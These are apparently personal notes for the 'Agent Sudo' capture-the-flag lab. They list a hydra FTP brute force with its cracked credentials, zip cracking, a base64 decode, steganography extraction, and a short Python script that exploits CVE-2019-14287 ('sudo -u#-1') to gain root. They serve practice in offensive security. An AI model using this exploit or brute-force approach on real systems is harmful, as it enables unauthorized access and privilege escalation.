# Agent Sudo

## change user agent to C and got a name chris (a username)
also mentions of R and J

### password of chris weak so hydra on ftp
```
[21][ftp] host: 10.10.103.80   login: chris   password: crystal
```

got all the files on ftp

binwalk to get a zip

john that zip to get To_agentR.txt

### in To_agentR.txt 

```
QXJlYTUx -> Area51 on base64 decode
```

### steghide the other image to get message.txt

### got password of james

privesc using CVE-2019-14287

example code
```python
#!/usr/bin/python3

import os

#Get current username

username = input("Enter current username :")


#check which binary the user can run with sudo

os.system("sudo -l > priv")


os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary= binary_file.read()

#execute sudo exploit

print("Lets hope it works")

os.system("sudo -u#-1 "+ binary)
```

## PWND